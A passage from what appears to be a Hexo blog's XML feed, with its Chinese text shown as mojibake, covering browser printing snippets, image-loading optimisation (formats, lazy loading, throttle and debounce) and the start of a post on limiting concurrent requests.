class="keyword">this</span>.$refs.barcode, <span class="string">'YF123456'</span>, &#123;</span><br><span class="line">  format: <span class="string">'CODE128'</span>,</span><br><span class="line">  displayValue: <span class="literal">true</span>,</span><br><span class="line">  fontSize: <span class="number">30</span>,</span><br><span class="line">  height: <span class="number">100</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-åˆ†é¡µç¬¦"><a href="#6-åˆ†é¡µç¬¦" class="headerlink" title="6. åˆ†é¡µç¬¦"></a>6. åˆ†é¡µç¬¦</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"page-break-before:left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5b371a8a6fb9a00e5326f06c" target="_blank" rel="noopener">window.print â€”â€” æµè§ˆå™¨æ‰“å°æ‰«ç›²</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å›¾ç‰‡åŠ è½½ä¼˜åŒ–</title>
      <link href="/2020/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2020/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<h3 id="1-é—®é¢˜"><a href="#1-é—®é¢˜" class="headerlink" title="1. é—®é¢˜"></a>1. é—®é¢˜</h3><p>elitembaä¸»ç«™ ä»¥å›¾ç‰‡å±•ç¤ºä¸ºä¸»ï¼Œå¯åŠ¨é¡µé¢æ—¶åŠ è½½è¿‡å¤šå›¾ç‰‡ï¼Œå›¾ç‰‡ä½“ç§¯è¿‡å¤§ï¼Œå¯¼è‡´ç­‰å¾…æ—¶é—´è¿‡é•¿ã€‚è¿™äº›å›¾ç‰‡è¯·æ±‚å‡ ä¹æ˜¯å¹¶å‘çš„ã€‚åœ¨Chromeæµè§ˆå™¨ï¼ŒåŒä¸€åŸŸåï¼Œæœ€å¤šæ”¯æŒ6ä¸ªè¯·æ±‚çš„å¹¶å‘ï¼Œå…¶ä»–çš„è¯·æ±‚å°†ä¼šæ¨å…¥åˆ°é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œç›´åˆ°6ä¸ªè¯·æ±‚ä¸­çš„ä¸€ä¸ªå®Œæˆåï¼Œé˜Ÿåˆ—ä¸­çš„æ–°è¯·æ±‚æ‰ä¼šå‘å‡ºã€‚</p><p>ä¸‹é¢åˆ—å‡ºä¸€äº›å›¾ç‰‡åŠ è½½ä¼˜åŒ–æ–¹æ³•ã€‚</p><p><br></p><h3 id="1-å‹ç¼©å›¾ç‰‡ä½“ç§¯"><a href="#1-å‹ç¼©å›¾ç‰‡ä½“ç§¯" class="headerlink" title="1. å‹ç¼©å›¾ç‰‡ä½“ç§¯"></a>1. å‹ç¼©å›¾ç‰‡ä½“ç§¯</h3><h4 id="1-1-å›¾ç‰‡æ ¼å¼"><a href="#1-1-å›¾ç‰‡æ ¼å¼" class="headerlink" title="1.1 å›¾ç‰‡æ ¼å¼"></a>1.1 å›¾ç‰‡æ ¼å¼</h4><p>Webå›¾ç‰‡æ ¼å¼æœ‰JPEG/JPGã€PNGã€WebPã€Base64ã€SVGç­‰ã€‚</p><p><em>JPEG/JPG</em><br><strong>æœ‰æŸå‹ç¼©ã€ä½“ç§¯å°ã€ä¸æ”¯æŒé€æ˜ã€‚</strong>å½“æˆ‘ä»¬æŠŠå›¾ç‰‡ä½“ç§¯å‹ç¼©è‡³åŸæœ‰ä½“ç§¯çš„ 50% ä»¥ä¸‹æ—¶ï¼ŒJPG ä»ç„¶å¯ä»¥ä¿æŒä½ 60% çš„å“è´¨ã€‚æ­¤å¤–ï¼ŒJPG æ ¼å¼ä»¥ 24 ä½å­˜å‚¨å•ä¸ªå›¾ï¼Œå¯ä»¥å‘ˆç°å¤šè¾¾ 1600 ä¸‡ç§é¢œè‰²ã€‚JPG é€‚ç”¨äºå‘ˆç°è‰²å½©ä¸°å¯Œçš„å›¾ç‰‡ï¼Œåœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä¸­ï¼ŒJPG å›¾ç‰‡ç»å¸¸ä½œä¸ºå¤§çš„èƒŒæ™¯å›¾ã€è½®æ’­å›¾æˆ– Banner å›¾å‡ºç°ã€‚</p><p>ä½†å®ƒå¤„ç†çŸ¢é‡å›¾å½¢å’Œlogoç­‰çº¿æ¡æ„Ÿè¾ƒå¼ºã€é¢œè‰²å¯¹æ¯”å¼ºçƒˆçš„å›¾åƒæ—¶ï¼Œäººä¸ºå‹ç¼©å¯¼è‡´çš„å›¾ç‰‡æ¨¡ç³Šä¼šç›¸å½“æ˜æ˜¾ã€‚</p><p><em>PNG-8/PNG-24</em><br><strong>æ— æŸå‹ç¼©ã€è´¨é‡é«˜ã€ä½“ç§¯å¤§ã€æ”¯æŒé€æ˜</strong> PNGæ˜¯ä¸€ç§æ— æŸå‹ç¼©çš„é«˜ä¿çœŸçš„å›¾ç‰‡æ ¼å¼ï¼Œ8ä½PNGæ”¯æŒ256ä¸­é¢œè‰²ï¼Œ24ä½å¯å‘ˆç°1600ä¸‡ä¸­é¢œè‰²ã€‚è€ƒè™‘åˆ° PNG åœ¨å¤„ç†çº¿æ¡å’Œé¢œè‰²å¯¹æ¯”åº¦æ–¹é¢çš„ä¼˜åŠ¿ï¼Œæˆ‘ä»¬ä¸»è¦ç”¨å®ƒæ¥å‘ˆç°å°çš„ Logoã€é¢œè‰²ç®€å•ä¸”å¯¹æ¯”å¼ºçƒˆçš„å›¾ç‰‡æˆ–èƒŒæ™¯ã€‚</p><p><em>SVG</em><br><strong>æ–‡æœ¬æ–‡ä»¶ã€ä½“ç§¯å°ã€ä¸å¤±çœŸã€å…¼å®¹æ€§å¥½</strong>SVGæ˜¯ä¸€ç§åŸºäºXMLè¯­æ³•çš„å›¾åƒæ ¼å¼ï¼Œå®ƒå¯¹å›¾åƒçš„å¤„ç†ä¸æ˜¯åŸºäºåƒç´ ç‚¹ï¼Œè€Œæ˜¯åŸºäºå¯¹å›¾åƒçš„å½¢çŠ¶æè¿°ã€‚å®ƒçš„ä¼˜åŠ¿æ˜¯å›¾ç‰‡å¯æ— çº¿æ”¾å¤§è€Œä¸å¤±çœŸã€‚å› ä¸ºSVGæ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åƒå†™ä»£ç ä¸€æ ·å®šä¹‰SVGï¼ŒæŠŠå®ƒå†™åœ¨HTMLé‡Œã€æˆä¸ºDOMçš„ä¸€éƒ¨åˆ†ã€‚</p><p><em>Base64</em><br>Base64ä¸æ˜¯ä¸€ç§å›¾ç‰‡æ ¼å¼ï¼Œè€Œæ˜¯ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä½œä¸ºå°å›¾æ ‡è§£å†³æ–¹æ¡ˆè€Œå­˜åœ¨ã€‚é€šè¿‡å¯¹å›¾ç‰‡è¿›è¡Œbaser64ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ç¼–ç ç»“æœå†™å…¥HTMLæˆ–è€…CSSï¼Œä»è€Œå‡å°‘HTTPè¯·æ±‚çš„æ¬¡æ•°ã€‚</p><p><em>WebP</em><br>å®ƒäº 2010 å¹´è¢«æå‡ºï¼Œ æ˜¯Googleä¸“ä¸ºWebå¼€å‘çš„ä¸€ç§æ—¨åœ¨åŠ å¿«å›¾ç‰‡åŠ è½½é€Ÿåº¦çš„å›¾ç‰‡æ ¼å¼ï¼Œå®ƒæ”¯æŒæœ‰æŸå‹ç¼©å’Œæ— æŸå‹ç¼©ã€‚ä¸pngç›¸æ¯”ï¼ŒWebPæ— æŸå›¾åƒçš„å¤§å°å¯ä»¥ç¼©å°26%ï¼Œæ¯”åŒç±»jpegå°25-36%ã€‚</p><p><br></p><h4 id="1-2-å›¾ç‰‡è£å‰ª"><a href="#1-2-å›¾ç‰‡è£å‰ª" class="headerlink" title="1.2 å›¾ç‰‡è£å‰ª"></a>1.2 å›¾ç‰‡è£å‰ª</h4><ul><li>é˜¿é‡Œäº‘osså›¾ç‰‡æœåŠ¡ / ä¸ƒç‰›å›¾ç‰‡æœåŠ¡ï¼Œæä¾›äº†å›¾ç‰‡æ ¼å¼è½¬æ¢ã€æŒ‰å°ºå¯¸è£å‰ªç­‰å›¾ç‰‡å¤„ç†åŠŸèƒ½ã€‚é…åˆ<code>lib-flexible</code>ï¼Œå°±å¯ä»¥å¯¹ä¸åŒè®¾å¤‡åŠ è½½ä¸åŒå°ºå¯¸çš„å›¾ç‰‡ã€‚</li></ul><p><br></p><h3 id="2-å ä½æ˜¾ç¤º"><a href="#2-å ä½æ˜¾ç¤º" class="headerlink" title="2. å ä½æ˜¾ç¤º"></a>2. å ä½æ˜¾ç¤º</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">60%</span>;  <span class="comment">/* å›¾ç‰‡æ¯”ä¾‹ */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ccc</span> no-repeat center center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;img src="1.png"&gt;</span><br></pre></td></tr></table></figure><p>pcä¸Šï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šä¸º<code>&lt;img&gt;</code>è®¾ç½®widthå’Œheightå±æ€§æ¥è§£å†³å›¾ç‰‡å ä½é—®é¢˜ã€‚ä½†åœ¨ç§»åŠ¨ç«¯ï¼Œç”¨å ä½å›¾æˆ–min-heightæ¥å ä½ï¼Œå¦‚æœä¸éœ€è¦åŠ è½½çš„å›¾ç‰‡å°ºå¯¸å·®åˆ«å¾ˆå¤§ï¼Œä¼šå‡ºç°é¡µé¢çš„å†…å®¹è·³åŠ¨ï¼Œè¿™ä¹Ÿä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p><p><br><br><br></p><h3 id="3-æ‡’åŠ è½½"><a href="#3-æ‡’åŠ è½½" class="headerlink" title="3. æ‡’åŠ è½½"></a>3. æ‡’åŠ è½½</h3><p>æ»šåŠ¨åˆ°å¯è§†åŒºåŸŸåå†å»åŠ è½½å›¾ç‰‡<br><br></p><h4 id="3-1-åŸç†"><a href="#3-1-åŸç†" class="headerlink" title="3.1 åŸç†"></a>3.1 åŸç†</h4><p>å°†é¡µé¢ä¸­<code>&lt;img&gt;</code>çš„<code>src</code>æŒ‡å‘ä¸€å¼ é»˜è®¤å›¾ï¼Œç„¶åå®šä¹‰<code>data-src</code>æŒ‡å‘çœŸå®çš„å›¾ç‰‡ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- æ³¨æ„: å›¾ç‰‡è¦æŒ‡å®šå®½é«˜ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"default.jpg"</span> <span class="attr">data-src</span>=<span class="string">"http://www.elitemba.cn/static/images/1.png"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å½“è½½å…¥é¡µé¢æ—¶ï¼Œå…ˆæŠŠå¯è§†åŒºåŸŸå†…çš„<code>&lt;img&gt;</code>æ ‡ç­¾çš„<code>data-src</code>å±æ€§å€¼èµ‹ç»™<code>src</code>ã€‚ç„¶åç›‘å¬æ»šåŠ¨äº‹ä»¶ï¼ŒåŒç†ä¿®æ”¹å¯è§†åŒºåŸŸçš„å›¾ç‰‡çš„srcå€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line"><span class="keyword">var</span> num = img.length;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;  <span class="comment">// å­˜å‚¨å›¾ç‰‡åŠ è½½åˆ°çš„ä½ç½®ï¼Œé¿å…æ¯æ¬¡éƒ½ä»ç¬¬ä¸€å¼ å›¾ç‰‡å¼€å§‹éå†</span></span><br><span class="line"></span><br><span class="line">lazyload(); <span class="comment">// é¡µé¢è½½å…¥å®Œæ¯•åŠ è½½å¯è§†åŒºåŸŸå†…çš„å›¾ç‰‡</span></span><br><span class="line"><span class="built_in">window</span>.onscroll = lazyload;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazyload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> seeHeight = <span class="built_in">document</span>.documentElement.clientHeight; <span class="comment">// å¯è§åŒºåŸŸé«˜åº¦</span></span><br><span class="line">  <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop; <span class="comment">// æ»šåŠ¨æ¡è·ç¦»é¡¶éƒ¨é«˜åº¦</span></span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">var</span> i = n ; i &lt; num; i++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> (img[i].offsetTop &lt; seeHeight + scrollTop)&#123;</span><br><span class="line">      <span class="keyword">if</span> (img[i].getAttribute(<span class="string">"src"</span>) == <span class="string">"default.jpg"</span>)&#123;</span><br><span class="line">        img[i].src = img[i].getAttribute(<span class="string">"data-src"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      n = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-èŠ‚æµå‡½æ•°"><a href="#3-2-èŠ‚æµå‡½æ•°" class="headerlink" title="3.2 èŠ‚æµå‡½æ•°"></a>3.2 èŠ‚æµå‡½æ•°</h4><p>å½“å‡½æ•°ç»‘å®šåœ¨<code>scroll</code>äº‹ä»¶ä¸Šï¼Œé¡µé¢æ»šåŠ¨æ—¶ï¼Œå‡½æ•°ä¼šè¢«é«˜é¢‘è§¦å‘ï¼Œè¿™éå¸¸å½±å“æµè§ˆå™¨çš„æ€§èƒ½ã€‚è¿™æ—¶éœ€è¦é™åˆ¶è§¦å‘é¢‘ç‡ã€‚<br><strong>èŠ‚æµå‡½æ•°: åªå…è®¸ä¸€ä¸ªå‡½æ•°åœ¨nç§’å†…æ‰§è¡Œä¸€æ¬¡</strong>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fun è¦æ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line"><span class="comment">// time åœ¨timeæ—¶é—´å†…å¿…é¡»æ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fun, time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>,</span><br><span class="line">        args = <span class="built_in">arguments</span>,</span><br><span class="line">        curTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœè¾¾åˆ°äº†è§„å®šçš„è§¦å‘æ—¶é—´é—´éš”ï¼Œè§¦å‘handler</span></span><br><span class="line">    <span class="keyword">if</span> ( curTime - startTime &gt;= time )&#123;</span><br><span class="line">      fun.apply(context, args);</span><br><span class="line">      startTime = curTime;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, throttle(lazy, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-å»æŠ–å‡½æ•°"><a href="#3-3-å»æŠ–å‡½æ•°" class="headerlink" title="3.3 å»æŠ–å‡½æ•°"></a>3.3 å»æŠ–å‡½æ•°</h4><p>è®©å‡½æ•°å»¶è¿Ÿæ‰§è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> time = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">    clearTimeout(time);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      fn.apply(context, args)</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®©å‡½æ•°å»¶è¿Ÿ500sæ‰§è¡Œ</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, debounce(lazyload, <span class="number">500</span>))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-éª¨æ¶å±"><a href="#4-éª¨æ¶å±" class="headerlink" title="4. éª¨æ¶å±"></a>4. éª¨æ¶å±</h3><p>éª¨æ¶å±å¯ä»¥ç†è§£ä¸º<em>å½“æ•°æ®è¿˜æœªåŠ è½½è¿›æ¥å‰ï¼Œé¡µé¢çš„ä¸€ä¸ªç©ºç™½ç‰ˆæœ¬</em>ã€‚é¡µé¢æ¸²æŸ“å®Œæˆä¹‹å‰ï¼Œç”¨æˆ·ä¼šçœ‹åˆ°å½“å‰é¡µé¢çš„å¤§è‡´éª¨æ¶ã€‚</p><p>ä¸‹é¢çš„ç¤ºä¾‹å›¾ï¼Œç¬¬ä¸€ä¸ªæ˜¯éª¨æ¶å±ï¼Œç¬¬äºŒä¸ªæ˜¯èŠèŠ±å›¾ï¼Œç¬¬ä¸‰ä¸ªæ— ä¼˜åŒ–ã€‚<br><br><br><img src="/2020/03/26/ç½‘é¡µå›¾ç‰‡åŠ è½½ä¼˜åŒ–/2.gif" style="max-width: 800px"><br><br></p><p>ç”Ÿæˆéª¨æ¶å±çš„æ–¹å¼: </p><ul><li>æ‰‹å†™HTMLï¼ŒCSSå®šåˆ¶éª¨æ¶å±ï¼Œä½†æ˜¯ç»´æŠ¤æˆæœ¬é«˜</li><li>ä½¿ç”¨å›¾ç‰‡ä½œä¸ºéª¨æ¶å±ï¼š å°ç±³å•†åŸçš„ç§»åŠ¨ç«¯é¡µé¢</li><li>è‡ªåŠ¨ç”Ÿæˆå¹¶è‡ªåŠ¨æ’å…¥é™æ€éª¨æ¶å± page-skeleton-webpack-plugin</li></ul><p><br></p><h3 id="5-æ¸è¿›å¼å›¾ç‰‡åŠ è½½"><a href="#5-æ¸è¿›å¼å›¾ç‰‡åŠ è½½" class="headerlink" title="5. æ¸è¿›å¼å›¾ç‰‡åŠ è½½"></a>5. æ¸è¿›å¼å›¾ç‰‡åŠ è½½</h3><p>çŸ¥ä¹ä¼šç”¨ä½åˆ†è¾¨çš„æ¨¡ç³Šå›¾ç‰‡æ¥åšé¢„è§ˆå›¾ï¼Œä»£æ›¿æ‡’åŠ è½½å›¾ç‰‡æ—¶ç”¨çš„logoå ä½å›¾ï¼Œé¢„è§ˆå›¾å¤§å°åœ¨2kb-3kbä¹‹é—´ã€‚<br><img src="/2020/03/26/ç½‘é¡µå›¾ç‰‡åŠ è½½ä¼˜åŒ–/1.gif"></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/33370207" target="_blank" rel="noopener">ç½‘é¡µå›¾ç‰‡åŠ è½½ä¼˜åŒ–æ–¹æ¡ˆ</a></li><li><a href="https://github.com/Jocs/jocs.github.io/issues/22" target="_blank" rel="noopener">ä¸€ç§è‡ªåŠ¨åŒ–ç”Ÿæˆéª¨æ¶å±çš„æ–¹æ¡ˆ</a></li><li><a href="https://juejin.im/post/5b79a2786fb9a01a18267362" target="_blank" rel="noopener">Vueé¡¹ç›®éª¨æ¶å±æ³¨å…¥å®è·µ</a></li><li><a href="https://github.com/ccforward/cc/issues/64" target="_blank" rel="noopener">é€‚ç”¨äºvue.jså’ŒåŸç”Ÿjsçš„æ¸è¿›å¼å›¾ç‰‡åŠ è½½</a></li><li><a href="https://juejin.im/post/583b10640ce463006ba2a71a" target="_blank" rel="noopener">å®ç°å›¾ç‰‡æ‡’åŠ è½½</a></li><li><a href="https://github.com/ElemeFE/page-skeleton-webpack-plugin" target="_blank" rel="noopener">page-skeleton-webpack-plugin</a></li><li><a href="https://www.jianshu.com/p/a5fd143c6184" target="_blank" rel="noopener">CSSå®ç°å›¾ç‰‡æœªåŠ è½½å®Œæˆæ—¶å ä½æ˜¾ç¤º</a></li><li><a href="https://lq1228.github.io/front/article/2016/11/24/layout-image.html" target="_blank" rel="noopener">CSSå®ç° å›¾ç‰‡åŠ è½½å‰çš„å ä½é«˜åº¦é¢„è®¾</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jsæ§åˆ¶å¹¶å‘è¯·æ±‚æ•°</title>
      <link href="/2020/02/22/js%E6%8E%A7%E5%88%B6%E5%B9%B6%E5%8F%91%E8%AF%B7%E6%B1%82%E6%95%B0/"/>
      <url>/2020/02/22/js%E6%8E%A7%E5%88%B6%E5%B9%B6%E5%8F%91%E8%AF%B7%E6%B1%82%E6%95%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-Bug"><a href="#1-Bug" class="headerlink" title="1. Bug"></a>1. Bug</h3><p>ç¢°åˆ°ä¸€ä¸ªå›¾ç‰‡åˆ—è¡¨ï¼Œéƒ¨åˆ†å›¾ç‰‡è¯·æ±‚å¤±è´¥çš„bugï¼Œå¤„ç†äº†ä¸€æ³¢è¯·æ±‚å¤±è´¥è¦æ€ä¹ˆæ˜¾ç¤ºã€‚<br>å‡†å¤‡å›å®¶æå®Œæœ€åä¸€ç‚¹ï¼Œç»“æœå›å®¶ä¹‹åï¼Œç½‘é€Ÿå˜æ…¢äº†ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œè¯·æ±‚å¤±è´¥çš„å›¾ç‰‡æ›´å¤šäº†ã€‚</p><p><img src="/2020/02/22/jsæ§åˆ¶å¹¶å‘è¯·æ±‚æ•°/3.jpg" style="max-width: 100px"></p><p>ä»”ç»†ä¸€çœ‹ï¼Œhttp statusä¸º<em>canceled</em>ï¼Œæ—¶é—´éƒ½åœ¨30sä¹‹åã€‚<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸æ˜¯å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥ï¼Œè€Œæ˜¯ä¸€æ—¶é—´å¹¶å‘è¯·æ±‚å¤ªå¤šï¼Œè¯·æ±‚å µå¡ï¼Œå¯¼è‡´åé¢çš„è¯·æ±‚è¶…æ—¶ï¼Œå¯¼è‡´æœ€ç»ˆè¢«å–æ¶ˆã€‚<br><strong>ï¼ˆ æµè§ˆå™¨é™åˆ¶åŒä¸€åŸŸååŒä¸€æ—¶é—´åªèƒ½æœ‰6ä¸ªå¹¶å‘è¯·æ±‚ ï¼‰</strong></p><p><img src="/2020/02/22/jsæ§åˆ¶å¹¶å‘è¯·æ±‚æ•°/2.png"></p><p><img src="/2020/02/22/jsæ§åˆ¶å¹¶å‘è¯·æ±‚æ•°/1.png"></p><p><br></p><h3 id="2-ä¸ºä»€ä¹ˆå¹³æ—¶æ‰¹é‡è¯·æ±‚å›¾ç‰‡æ²¡é—®é¢˜"><a href="#2-ä¸ºä»€ä¹ˆå¹³æ—¶æ‰¹é‡è¯·æ±‚å›¾ç‰‡æ²¡é—®é¢˜" class="headerlink" title="2. ä¸ºä»€ä¹ˆå¹³æ—¶æ‰¹é‡è¯·æ±‚å›¾ç‰‡æ²¡é—®é¢˜"></a>2. ä¸ºä»€ä¹ˆå¹³æ—¶æ‰¹é‡è¯·æ±‚å›¾ç‰‡æ²¡é—®é¢˜</h3><p>è¿™æ¬¡çš„å›¾ç‰‡æ˜¯é€šè¿‡XHRè¯·æ±‚ï¼Œè·å–å›¾ç‰‡çš„base64å†…å®¹ã€‚æˆ‘ä»¬ä¸€èˆ¬ä¼šç»™XHRè®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œè€Œå¹³æ—¶ç”¨çš„<code>&lt;img src&gt;</code>æ²¡æœ‰äººä¸ºçš„è¶…æ—¶é™åˆ¶ï¼Œåªæœ‰æœåŠ¡å™¨æ˜ç¡®è¿”å›è¯·æ±‚å¤±è´¥ï¼Œæ‰ç®—å¤±è´¥ã€‚</p><p><br></p><h3 id="3-è§£å†³"><a href="#3-è§£å†³" class="headerlink" title="3. è§£å†³"></a>3. è§£å†³</h3><p>è¿™æ—¶æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªå¹¶å‘æ§åˆ¶å‡½æ•°ï¼Œä¿è¯æ¯æ¬¡æœ€å¤šåªæœ‰6ä¸ªè¯·æ±‚ï¼Œæ— è®ºå“ªä¸€ä¸ªå…ˆæ‰§è¡Œå®Œï¼Œéƒ½ä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªï¼Œç›´åˆ°æ‰€æœ‰è¯·æ±‚å®Œæˆã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @params list &#123;Array&#125; ç­‰å¾…è¯·æ±‚çš„é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment"> * @params limit &#123;Number&#125; æ§åˆ¶çš„å¹¶å‘æ•°é‡æœ€å¤§æ•°</span></span><br><span class="line"><span class="comment"> * @params asyncHandle &#123;Function&#125; å¯¹listæ¯ä¸€é¡¹çš„è¯·æ±‚å‡½æ•°ï¼Œå¿…é¡»return Promiseæ¥ç»§ç»­è¿›è¡Œè¯·æ±‚</span></span><br><span class="line"><span class="comment"> * @return &#123;Promise&#125; è¿”å›ä¸€ä¸ª Promise ç¡®è®¤æ‰€æœ‰æ•°æ®æ˜¯å¦è¿­ä»£å®Œæˆ</span></span><br><span 